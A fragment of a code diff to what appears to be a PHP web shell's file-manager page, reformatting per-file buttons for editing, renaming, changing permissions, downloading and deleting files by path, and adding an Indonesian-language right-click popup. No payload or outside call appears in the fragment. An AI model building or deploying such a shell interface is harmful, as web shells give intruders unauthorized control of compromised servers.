-                    <a href="?option&path=<?= $path ?>&rename=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-sharp fa-regular fa-pencil"></i></button></a>
-                    <a href="?option&path=<?= $path ?>&permission=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white hover:text-black border rounded-lg focus:ring-4 focus:ring-yellow-300 dark:focus:ring-yellow-700 hover:bg-yellow-600"><i class="fa-regular fa-user-pen"></i></button></a>
-                    <a href="?option&path=<?= $path ?>&downloadfile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white hover:text-black border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-900 hover:bg-white"><i class="fa-solid fa-download"></i></button></a>
-                    <a href="?option&path=<?= $path ?>&deletefile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-regular fa-trash-can-xmark"></i></button></a>
-                    </div>
-                    <?php echo "</center></td></tr>"; } ?>
-                </tbody>
-            </table>
-        </div>
-        <?=$s_he_ll_Footer?>
-
-        <!-- Flowbite JS -->
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.js"></script>
+                                <div class="flex justify-center items-center flex-row flex-nowrap whitespace-nowrap">
+                                    <a href="?option&path=<?= $path ?>&editfile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-emerald-200 dark:focus:ring-emerald-900 hover:bg-emerald-800"><i class="fa-sharp fa-regular fa-file-pen"></i></button></a>
+                                    <a href="?option&path=<?= $path ?>&rename=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-sky-200 dark:focus:ring-sky-900 hover:bg-sky-800"><i class="fa-sharp fa-regular fa-pencil"></i></button></a>
+                                    <a href="?option&path=<?= $path ?>&permission=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white hover:text-black border rounded-lg focus:ring-4 focus:ring-yellow-300 dark:focus:ring-yellow-700 hover:bg-yellow-600"><i class="fa-regular fa-user-pen"></i></button></a>
+                                    <a href="?option&path=<?= $path ?>&downloadfile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white hover:text-black border rounded-lg focus:ring-4 focus:ring-slate-200 dark:focus:ring-slate-900 hover:bg-white"><i class="fa-solid fa-download"></i></button></a>
+                                    <a href="?option&path=<?= $path ?>&deletefile=<?=$file?>"><button type="button" class="inline-flex items-center px-2 py-2 mx-2 text-sm font-medium text-center text-white border rounded-lg focus:ring-4 focus:ring-red-200 dark:focus:ring-red-900 hover:bg-red-800"><i class="fa-regular fa-trash-can-xmark"></i></button></a>
+                                </div>
+                                <?php echo "</center></td></tr>"; } ?>
+            </tbody>
+        </table>
+    </div>
+    <?=$s_he_ll_Footer?>
+    <!-- POPUP -->
+    <style>
+        #popupMenu {
+            display: none;
+            position: absolute;
+            background: transparent;
+            color: #fff;
+            border: 1px solid #999;
+            border-radius: 5px;
+            padding: 5px;
+            box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.2);
+            z-index: 99999;
+            text-align: center;
+            transition: 0.5s;
+        }
+        #popupMenu:hover {
+            background: rgba(0, 0, 0, 0.75);
+        }
+    </style>
+    <div id="popupMenu">
+        <span>Mau Ngapain Masbro?</span>
+    </div>
+    <script type="text/javascript">
+        var tes = document.getElementById('popupMenu');
+        document.addEventListener("contextmenu", function(event) {
+        event.preventDefault();
+        popupMenu.style.left = event.clientX + "px";
+        popupMenu.style.top = event.clientY + "px";
+        popupMenu.style.display = "block";
+        });
+        document.addEventListener("click", function(event) {
+            popupMenu.style.display = "none";
+        });
+    </script>
+    <!-- Flowbite JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.js"></script>
 </body>
+
 </html>
